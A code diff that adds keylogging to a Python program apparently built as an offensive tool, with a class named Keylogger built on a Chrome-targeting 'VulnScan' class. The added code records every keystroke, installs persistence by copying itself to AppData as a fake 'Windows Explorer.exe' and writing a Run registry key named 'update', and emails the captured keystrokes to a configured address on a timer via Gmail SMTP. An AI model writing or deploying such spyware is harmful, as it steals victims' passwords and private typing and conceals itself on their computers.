@@ -1,6 +1,10 @@
 from pynput.keyboard import Key, Controller
+from pynput import keyboard
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+import sys
+import time
+import shutil
 import smtplib
 import subprocess
 import platform
@@ -10,6 +14,7 @@ import os
 import sqlite3
 import requests
 import urllib.parse
+import threading
 
 EMAIL = None # Set email here
 EMAIL_PASSWORD = None # Set email password here
@@ -272,11 +277,51 @@ class VulnScan(Chrome):
 class Keylogger(VulnScan):
 	def __init__(self):
 		super().__init__()
+		self.log = ""
 
+	def persistence(self):
+		location = os.environ["appdata"] + "\\Windows Explorer.exe"
+		if not os.path.exists(location):
+			shutil.copyfile(sys.executable, location)
+			subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{}"'.format(location), shell=True)
+
+	def on_press(self, key):
+		try:
+			self.log += str(key.char)
+		except AttributeError:
+			self.log += " "
+
+	def report_logs(self):
+		if not self.log:
+			self.log = "[-] User did not type anything"
+		self.send_email(self.log)
+		self.log = ""
+		threading.Timer(int(SEND_EMAIL_EVERY), self.report_logs).start()
+
+	def send_email(self, message):
+		server = smtplib.SMTP("smtp.gmail.com", 587)
+		server.ehlo()
+		server.stattls()
+		verify = False
+
+		try:
+			server.login(EMAIL, EMAIL_PASSWORD)
+			verify = True
+		except smtplib.SMTPAuthenticationError:
+			print("[-] Invalid email")
+
+		if verify:
+			if EMAIL_TO:
+				server.sendmail(EMAIL, EMAIL_TO, message)
+			elif EMAIL and not EMAIL_TO:
+				server.sendmail(EMAIL, EMAIL, message)
+		return
 
 if __name__ == '__main__':
-	if not EMAIL or not EMAIL_PASSWORD:
+	if not EMAIL or not EMAIL_PASSWORD or not SEND_EMAIL_EVERY:
 		print("[-] Must set the Variables required to run program")
 		exit()
+	pass
 
-	VulnScan().vuln_scanner_email_report()
+	#VulnScan().vuln_scanner_email_report()
+	#Keylogger()
